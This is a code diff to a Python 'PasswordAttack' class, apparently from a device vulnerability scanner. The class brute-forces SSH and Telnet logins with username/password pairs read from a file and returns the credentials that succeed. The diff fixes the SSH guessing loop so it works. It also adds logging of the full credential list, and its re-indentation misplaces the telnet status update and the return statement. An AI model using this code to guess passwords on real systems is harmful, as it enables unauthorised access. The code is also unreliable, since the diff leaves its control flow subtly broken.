@@ -13,7 +13,6 @@ class PasswordAttack(GenericAttack):
     def initialize(self, result):
         self.running = True
         target = self.device['ip']
-
         if self.device["vulnerable_ports"] is None:
             result.update({"status": "no open ports"})
             return
@@ -38,16 +37,17 @@ class PasswordAttack(GenericAttack):
         if sshStatus["status"] or telnetStatus["status"]:
             result.update({"status":"vulnerable"})
         result.update({"ssh_status": sshStatus["status"]})
-	if sshStatus["status"]:	
-		result.update({"ssh_port": sshStatus["port"]})
-		result.update({"ssh_username": sshStatus["username"]})
-		result.update({"ssh_password": sshStatus["password"]})
-        result.update({"telnet_status": telnetStatus["status"]})
-	if telnetStatus["status"]:	
-		result.update({"telnet_port": telnetStatus["port"]})
-		result.update({"telnet_username": telnetStatus["username"]})
-		result.update({"telnet_password": telnetStatus["password"]})
-        return
+
+        if sshStatus["status"]:
+            result.update({"ssh_port": sshStatus["port"]})
+            result.update({"ssh_username": sshStatus["username"]})
+            result.update({"ssh_password": sshStatus["password"]})
+            result.update({"telnet_status": telnetStatus["status"]})
+        if telnetStatus["status"]:
+            result.update({"telnet_port": telnetStatus["port"]})
+            result.update({"telnet_username": telnetStatus["username"]})
+            result.update({"telnet_password": telnetStatus["password"]})
+            return
 
     def telnet_attack(self, victim, port_list, credential_file):
         host = victim
@@ -55,7 +55,7 @@ class PasswordAttack(GenericAttack):
         login_list = list(zip(*login_file))
         usernames = login_list[0]
         passwords = login_list[1]
-	timeout = 10
+        timeout = 10
 
         for port in port_list:
             counter = 0
@@ -81,25 +81,28 @@ class PasswordAttack(GenericAttack):
     def ssh_attack(self, victim, port_list, credential_file):
         login_file = csv.reader(open(credential_file, "rb"), delimiter="\t")
         login_list = list(zip(*login_file))
+        log.info(login_list)
         usernames = login_list[0]
         passwords = login_list[1]
 
         for p in port_list:
             counter = 0
-	    port = "port=" + str(p)
+            port = "port=" + str(p)
             while counter < len(usernames):
-		try:
-			ssh = pxssh.pxssh()
-			response = ""
-			ssh.login(IP, usernames[counter], passwords[counter], port)
-			ssh.sendline("uptime")
-			ssh.prompt()
-			response = ssh.before
-			if response != "":
-				return {"status":True, "port":p, "username":usernames[counter], "password":passwords[counter]}
-			ssh.logout()
-		except pxssh.ExceptionPxssh, e:
-			pass
+                try:
+                    ssh = pxssh.pxssh()
+                    response = ""
+                    ssh.login(victim, usernames[counter], passwords[counter], port)
+                    ssh.sendline("uptime")
+                    ssh.prompt()
+                    response = ssh.before
+                    if response != "":
+                        return {"status":True, "port":p, "username":usernames[counter], "password":passwords[counter]}
+                    ssh.logout()
+                except pxssh.ExceptionPxssh, e:
+                    pass
+                counter+=1
+
         return {"status":False}
 
     def shutdown(self):
